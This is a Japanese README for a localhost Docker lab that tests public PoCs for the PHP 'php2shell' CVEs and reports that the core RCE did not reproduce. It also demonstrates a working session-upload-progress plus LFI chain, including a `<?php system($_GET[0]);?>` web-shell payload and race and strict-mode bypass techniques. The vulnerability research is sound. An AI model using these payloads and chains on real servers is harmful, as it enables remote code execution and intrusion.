# PHP2Shell ローカル検証ラボ

> **自分が管理する隔離環境専用。** 外部の PHP サーバーに対して実行しないでください。
> このラボは 2026-10-21 17:00 JST 時点（公式パッチ公開前）の公開情報と公開 PoC を使って、
> `session.upload_progress` / multipart 経路で何が観測できるかを確かめるためのものです。

対象: CVE-2026-109618 / CVE-2026-109619（php2shell）
関連: `../references.md`（公式情報とリーク・二次情報の整理）

## 1. これは何か

Docker 上に **ASAN 付き PHP 8.4.4** を 2 つ立てます。

| サービス | ホスト側ポート | PHP | `session.upload_progress.enabled` |
| --- | --- | --- | --- |
| `php-vuln` | `127.0.0.1:8080` | 8.4.4 (ASAN) | `1`（既定） |
| `php-mitigated` | `127.0.0.1:8081` | 8.4.4 (ASAN) | `0`（緩和策） |
| `php56`（profile） | `127.0.0.1:8083` | 5.6.40（公式イメージ） | `1` |
| `php-patched`（profile） | `127.0.0.1:8082` | `PATCHED_VERSION` | `1` |

`php56` は共有された影響調査レポートに合わせた PHP 5.6.40 の確認用です。
公式イメージなので ASAN は入っていません。クラッシュ・HTTP 5xx・`uid=` の有無だけを見ます。

`attacker/attack.py` は次の 3 種類のリクエストを送ります。

1. **probe**: 正常な multipart。進捗がセッションに書かれるか、ファイルが解析されるかを見る。
2. **trigger**: 公開情報にある 258 バイトのトリガー。単発送信と、`min_freq` を跨ぐ分割送信の両方。
3. **poc618 / poc619**: 公開バンドル `Zer061/CVE-2026-109618` の攻撃ボディを HTTP 用に移植したもの。
   レスポンスに `uid=` が出るか、ASAN レポートが出るか、ワーカーが落ちるかを見る。

## 2. 起動

```sh
cd "slides/slides/PHP2SHELLという悪夢の再来を検証してみる/sandbox"
docker compose up -d --build
python3 attacker/attack.py --mode all
```

まとめて実行する場合:

```sh
./run.sh
```

停止:

```sh
docker compose down
```

## 3. 観測モード

```sh
python3 attacker/attack.py --mode probe
python3 attacker/attack.py --mode trigger
python3 attacker/attack.py --mode poc618
python3 attacker/attack.py --mode poc619
python3 attacker/attack.py --mode all
```

主なオプション:

| オプション | 既定値 | 意味 |
| --- | --- | --- |
| `--target` | `http://127.0.0.1:8080/index.php` | 脆弱側 |
| `--mitigated` | `http://127.0.0.1:8081/index.php` | `enabled=0` 側 |
| `--command` | `id` | PoC が実行できた場合に呼ぶコマンド |
| `--rce-pattern` | `uid=` | RCE 判定に使う文字列 |
| `--call` | `0` | 偽造レコードの call 先。既定は無害な 0 |
| `--stall` | `1.5` | 2 回目の `FILE_DATA` を誘発する待ち時間 |
| `--save-raw` | off | 生のリクエスト/レスポンスを `data/raw/` に保存 |
| `--jsonl` | `data/evidence.jsonl` | 1 リクエスト 1 行の証跡 |
| `--asan-dir` | `data/logs` | ASAN / FPM ログの場所 |
| `--allow-nonlocal` | off | ラボ外ホストを明示的に許可（通常は使わない） |

`--target` / `--mitigated` は `127.0.0.1`, `localhost`, `php-vuln`, `php-mitigated`,
`php-patched`, `nginx` 以外を拒否します。`--allow-nonlocal` を付けた場合だけ、
自分が所有するホストを指定できます。

## 4. 2026-10-21 17:00 JST 時点の実測

実行コマンド:

```sh
python3 attacker/attack.py --mode all --save-raw
```

出力:

```text
[*] target=http://127.0.0.1:8080/index.php
[*] mitigated=http://127.0.0.1:8081/index.php
[*] evidence=data/evidence.jsonl
[probe:vuln] status=200 upload_progress=present file_parsed=True file_error=0
[probe:mitigated] status=200 upload_progress=absent file_parsed=True file_error=0
[trigger-single] status=200 progress=present bytes_processed=258 file_bytes=1 done=True asan=no
[trigger-stall] status=200 progress=present bytes_processed=258 file_bytes=1 done=True asan=no
[poc618] status=200 resp=467B rce=no asan=no failure=no
[poc619] status=200 resp=357B rce=no asan=no failure=no
[probe:after] status=200 upload_progress=present file_parsed=True file_error=0
[*] summary
    rce=False asan=False http_or_worker_failure=False
    RESULT: no RCE or sanitizer report in this run
```

読み取れること:

| 主張 | ラボでの観測 | 判定 |
| --- | --- | --- |
| 進捗情報はアプリのスクリプトより前にセッションへ書かれる | `8080` で `upload_progress` が present | 確認 |
| `session.upload_progress.enabled=0` で進捗は止まる | `8081` で `upload_progress` が absent | 確認 |
| 設定を切っても multipart パーサ自体は動く | `8081` でも `files.f` が解析される | 確認（構造） |
| 258 バイトの trigger が進捗ストア経路に到達する | `bytes_processed=258`, `files[0].bytes_processed=1`, `done=true` | 確認 |
| 公開 PoC で UAF / RCE が再現する | ASAN レポートなし、`uid=` なし、HTTP 200、ワーカー生存 | **再現せず** |

公開 PoC の詳細な解析と、なぜ UAF にならないかの計測は
[`ANALYSIS.md`](ANALYSIS.md) にまとめています。

`poc618` / `poc619` のレスポンスには、公開バンドルが lab で確認したと主張する
`files[]`（`f` と `g`、`g.bytes_processed=64` など）が実際に現れます。
つまり **store 経路には到達している**。しかし、この環境では UAF も RCE も観測できませんでした。

これは公開バンドル自身の `VALIDATION.md` の記述（「ASAN の heap-use-after-free は
ローカルでは発火しなかった」「ASAN crash は未証明」）と一致します。
**公開 PoC が到達するのは脆弱なコード経路までで、RCE の再現証明ではない**、
というのがこのラボの現時点の結論です。

## 5. PHP 5.6.40 での確認

共有されたレポートの対象が PHP 5.6.40 なので、同じ系列の公式イメージでも確認できます。

```sh
docker compose --profile php56 up -d
curl -sS http://127.0.0.1:8083/index.php
python3 attacker/attack.py --mode trigger \
  --target http://127.0.0.1:8083/index.php \
  --mitigated http://127.0.0.1:8083/index.php
python3 attacker/attack.py --mode poc618 \
  --target http://127.0.0.1:8083/index.php \
  --mitigated http://127.0.0.1:8083/index.php
python3 attacker/attack.py --mode poc619 \
  --target http://127.0.0.1:8083/index.php \
  --mitigated http://127.0.0.1:8083/index.php
docker compose logs php56
```

2026-10-21 17:05 JST の実測:

| 確認 | 結果 |
| --- | --- |
| PHP 5.6.40 で `upload_progress` が書かれる | `bytes_processed=258`, `files[0].bytes_processed=1`, `done=true` |
| 公開 PoC 618/619 | HTTP 200、`uid=` なし、FPM の異常終了なし |
| ASAN | 公式 5.6 イメージは非 ASAN のため判定不可 |

5.6.40 でも **upload_progress のストア経路は動く**ことは確認できました。
ただし、公開 PoC の偽造レコードは 8.x 向けのオフセット・構造を前提にしており、
5.6 の UAF/RCE をそのまま証明するものではありません。
5.6 で RCE を判定するには 5.6 固有のビルド・シンボル・ヒープ形状に合わせた検証が必要です。

公開 PoC の `DELTA_CALL` が想定する **PHP 8.5.4** でも ASAN ビルドで試しましたが、
trigger のストア経路には到達するものの、618/619 は HTTP 200・`uid=` なし・
ASAN レポートなしでした。詳細は [`ANALYSIS.md`](ANALYSIS.md) を参照してください。


## 6. multipart upload progress + LFI（CVE とは別の既知チェーン）

ここまでは「PHP コアの UAF」を追ってきましたが、実際に **マルチパート + 別の脆弱性**
で RCE にする既知の鎖もラボに入れています。対象は `lfi-demo/index.php` の
**意図的に脆弱な LFI** です。CVE の再現ではありません。

```sh
docker compose up -d
python3 attacker/lfi_demo.py
```

実行結果（2026-10-21 17:30 JST）:

```text
[*] upload http://127.0.0.1:8087/index.php sid=lfi786d1f2a3aa103f9886fd69a
[*] payload=<?php system($_GET[0]);?>
[*] upload status=200 body=b''
[*] include /tmp/sess_lfi786d1f2a3aa103f9886fd69a
[*] lfi status=200 bytes=396
upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
[*] command output present: True
```

### ソース上の鎖

1. `main/rfc1867.c` の `MULTIPART_EVENT_FORMDATA` が、
   `PHP_SESSION_UPLOAD_PROGRESS` の値を `event_formdata.value` として渡す。
2. `ext/session/session.c` の `php_session_rfc1867_callback()` が
   `progress->key = "upload_progress_" + value` を作る。
3. `php_session_rfc1867_update()` が `php_session_initialize()` →
   `zend_hash_update()` を行い、**アプリのスクリプトが動く前**に
   `sess_<PHPSESSID>` へシリアライズして書き込む。
4. `php_session_rfc1867_early_find_sid()` は Cookie / GET の `PHPSESSID` を使うため、
   攻撃者がセッションファイル名を選べる（`session.use_strict_mode=0` の既定）。
5. アプリに LFI があると、`sess_<id>` を `include` した瞬間に、
   シリアライズされたキー文字列の中の `<?php ... ?>` が実行される。

成立条件:

- アプリ側に **LFI / ファイルインクルード**（またはセッションファイルを読む sink）があること。
  これが「後何個かの脆弱性」の中心です。
- `session.upload_progress.enabled=On`（既定）。
- `session.use_strict_mode=0`（既定）でセッション ID を固定できること。
- `session.upload_progress.cleanup=0` なら確実。既定の `1` の場合は
  アップロード中に LFI を叩くレースが必要。
- `session.save_path` の場所が分かること（`/tmp`, `/var/lib/php/sessions` など）。


### さらに検証した条件

| 条件 | 実行 | 結果 |
| --- | --- | --- |
| 既定 `cleanup=1` のレース | `docker compose --profile cleanup up -d php-cleanup` → `python3 attacker/race_demo.py` | 3/3 で `uid=` |
| `enabled=0` + アップロード一時ファイル include | `python3 attacker/upload_include.py` | `uid=`（8089） |
| `use_strict_mode=1`（攻撃者指定 SID） | `docker compose --profile strict up -d php-strict` → `python3 attacker/lfi_demo.py --target http://127.0.0.1:8090/index.php` | 失敗 |
| `use_strict_mode=1` + `Set-Cookie` 追従 | 上記に `--follow-cookie` | `uid=` |
| mod_php (Apache) | `php:8.4.4-apache` を 8091 で起動 → `lfi_demo.py --target http://127.0.0.1:8091/index.php` | `uid=` |

補足:

- **`cleanup=1` は十分な対策ではない**。最初のチャンクを `FILLUNIT`（5120）以上にして
  アップロードを遅くすると、終了時の cleanup より前に LFI が間に合います。
- **`enabled=0` でも multipart の一時ファイルは作られる**。アプリが
  `$_FILES['f']['tmp_name']` を include する sink を持っていれば、別の RCE 経路が残ります。
- **`use_strict_mode=1` は SID を選べなくするが、進捗書き込み自体は止めない**。
  アップロード応答の `Set-Cookie` から新しい SID を読める状況（同一オリジン、
  XSS、SSRF、SID を反射するアプリなど）では `--follow-cookie` で成立します。
  `session.upload_progress.enabled=Off` の方が強い対策です。
- **mod_php でも成立**。この鎖は SAPI 非依存です。

この鎖は `session.upload_progress.enabled=Off` で **書き込み primitive 自体が止まる**ため、
共有レポートの「Off を最優先」は、この経路に対しては妥当です。
ただし `Off` でも multipart のファイルアップロード自体は続き、`$_FILES` の
一時ファイルは作られます。アプリがアップロードファイルを `include` する sink を
持っている場合は、別途そちらを塞ぐ必要があります（これが「設定だけでは不完全」の
実務的な意味になり得ます）。
一方、公開バンドルが主張する「PHP コアの UAF」は別物で、こちらはまだ再現していません。

## 7. パッチ公開後の比較

公式パッチが出たら、`PATCHED_VERSION` を修正版に変えて patched プロファイルを起動します。

```sh
PATCHED_VERSION=8.4.27 \
  docker compose -f compose.yaml -f compose.patched.yaml --profile patched up -d --build
python3 attacker/attack.py --mode all \
  --target http://127.0.0.1:8082/index.php \
  --mitigated http://127.0.0.1:8081/index.php \
  --asan-dir data/logs-patched
```

`8.4.27` は例です。実際の修正版番号は公式リリースで確認してください。
タグ/ tarball がまだ存在しない場合、ビルドは失敗します（その場合はリリース後に再実行）。

パッチ差分の確認例:

```sh
git clone --depth 1 --branch PHP-8.4 https://github.com/php/php-src.git /tmp/php-src
# 修正版タグができたら
git -C /tmp/php-src fetch --tags
git -C /tmp/php-src diff <修正前タグ>..<修正後タグ> -- ext/session/session.c main/rfc1867.c
```

## 8. 設計上の注意

- **`USE_ZEND_ALLOC=0`**: PHP の Zend アロケータを無効化し、`emalloc` を ASAN が見える
  `malloc` に逃がすため。これを入れないと Zend ヒープ内の UAF は ASAN に映りません。
- **`fastcgi_request_buffering off`**: nginx がリクエストボディをバッファすると、
  分割送信のタイミングが PHP に伝わらず、2 回目の `FILE_DATA` を作れません。
- **`session.upload_progress.cleanup=0`**: リクエスト終了後も進捗を残して観測できるように
  しています。既定は `1`（終了時に削除）です。
- **`--call 0`**: 公開 PoC の偽造レコードはビルド固有の `zend_call_function` アドレスを
  必要とします。このラボはアドレスリークや ASLR 回避を含まないため、既定では
  無害な 0 を入れています。`--call` を指定しても、この環境で RCE が成立する保証はありません。
- **ポートは `127.0.0.1` にのみ公開**。Docker ソケットはマウントしません。
  コンテナは使い捨て前提です。

## 9. 限界

- ASAN レポートが出ないことは「脆弱性が存在しない」証明ではありません。
  検出はビルド・アロケータ・ヒープ形状に依存します。
- 公開 PoC は build-specific なオフセットとアドレスリークを前提にしています。
  このラボはその完全な exploit chain を再現するものではありません。
- ツイートの画像は機構説明のスクリーンショットで、`uid=` や ASAN レポートなどの
  実行証跡ではありません。スクリーンショット単体では再現成功の証明になりません。
- jackalsyn ページの `status: weaponized (lab)` は自己申告です。同ページの
  `REPORT_VALIDATION.md` は「ASAN crash はローカルで未観測」と明記しており、
  ページの "verified" は主にソース行レベルの確認を指します。
- 2026-10-21 17:07 JST に配布 tarball を取得したところ、ページ記載の SHA-256
  `a29d640e…f683017` と実際の `0c254d54…60a0d63` が一致しませんでした
  （tar 展開後も `0c5047f8…` で不一致）。コード本体は GitHub ミラーと同一でしたが、
  配布物の完全性はページのハッシュだけでは確認できません。実行する場合は
  GitHub のコミットを固定してください。
- 共有された影響調査レポートの「`upload_progress=Off` で脆弱なコードパスは不実行」は、
  `php_session_rfc1867_callback` 側の話です。公開分析では multipart パーサ側にも
  経路があるとされており、**設定変更は部分緩和**として扱うべきです。
- 同レポートは内部アプリ名・認証情報のキー名などを含みます。公開リポジトリに
  そのままコミットしないでください。必要なら sandbox 外で管理するか、赤入れしてください。
- 公式の原因・影響バージョン・修正内容は、パッチ公開後に一次情報で確認してください。
  リーク情報と公式見解を混ぜないでください（`../references.md` の方針）。

## 10. ファイル

```text
sandbox/
├── README.md
├── ANALYSIS.md
├── compose.yaml
├── compose.patched.yaml
├── run.sh
├── docker/
│   ├── php/
│   │   ├── Dockerfile
│   │   ├── entrypoint.sh
│   │   ├── php-fpm.conf
│   │   ├── php-on.ini
│   │   ├── php-off.ini
│   │   └── php56.ini
│   └── nginx/
│       ├── nginx.conf
│       └── patched.conf
├── web/index.php
├── lfi-demo/index.php
├── attacker/
│   ├── attack.py
│   ├── lfi_demo.py
│   └── public_pocs.py
└── data/                  # 証跡（gitignore）
    ├── evidence.jsonl
    ├── logs/
    └── raw/
```

## 11. 参考

- `../references.md` — CVE / 公式予告 / Flatt / Sansec / Huntress / 研究者分析の整理
- 公開バンドル: <https://github.com/Zer061/CVE-2026-109618>
- JackalSyn writeup: <https://jackalsyn.com/posts/php-up-2026.html>
  - Mitigation 節も「`enabled=Off` は two likely paths の片方だけ」と明記しています。
- PHP Manual — Session Upload Progress: <https://www.php.net/manual/en/session.upload-progress.php>
- php-src `ext/session/session.c`, `main/rfc1867.c`
